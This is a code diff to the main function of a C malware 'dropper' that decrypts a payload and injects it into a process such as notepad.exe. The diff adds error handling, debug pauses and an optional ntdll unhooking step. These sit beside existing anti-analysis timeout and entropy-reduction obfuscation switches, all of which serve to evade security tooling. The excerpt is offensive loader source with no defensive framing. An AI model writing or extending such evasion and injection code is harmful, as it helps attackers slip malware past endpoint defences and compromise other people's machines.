@@ -41,7 +41,21 @@ int main() {
     DebugPrint("Debug mode enabled.\n");
     DebugPrint("Dropper started...\n");
 
-    InitializeApiFunctions();
+	if (!InitializeApiFunctions()) {
+		DebugPrint("[X] Failed to initialize API functions.\n");
+		return FALSE;
+	}
+    if (!InitializeSyscalls()) {
+        DebugPrint("[X] Failed to initialize syscalls.\n");
+        return FALSE;
+    }
+
+    DebugPrint("\n### Setup Complete ###\n\n");
+
+#ifdef DEBUG
+    DebugPrint("\n>> Press any key to continue...");
+    getchar();
+#endif
 
 #ifdef ENTROPY_REDUCTION_ENABLED
     init_obfuscation();
@@ -49,6 +63,10 @@ int main() {
 
 #ifdef ANTI_ANALYSIS_ENABLED
     AntiAnalysis(30000); // 30 seconds timeout
+#endif
+
+#ifdef UNHOOKING_ENABLED
+    unhookingNtdll();
 #endif
 
 BOOL bSuccess;
@@ -76,11 +94,6 @@ SIZE_T dwDecryptedPayloadSize = 0;
         return FALSE;
     }
 
-    if(!InitializeSyscalls()) {
-        DebugPrint("[X] Failed to initialize syscalls.\n");
-        return FALSE;
-    }
-
     DebugPrint("[i] Setup complete... Beginning injection!\n");
 #ifdef PROCESS_NAME_ENABLED
     LPWSTR szProcessName =  L"notepad.exe";
@@ -89,11 +102,14 @@ SIZE_T dwDecryptedPayloadSize = 0;
     bSuccess = inject_payload(pDecryptedPayload, PayloadSize);
 #endif
 
+#ifdef DEBUG
     if (bSuccess) {
         DebugPrint("[i] Payload injected successfully.\n");
     } else {
         DebugPrint("[X] Failed to inject payload.\n");
     }
+    getchar();
+#endif
 
     return 0;
 }
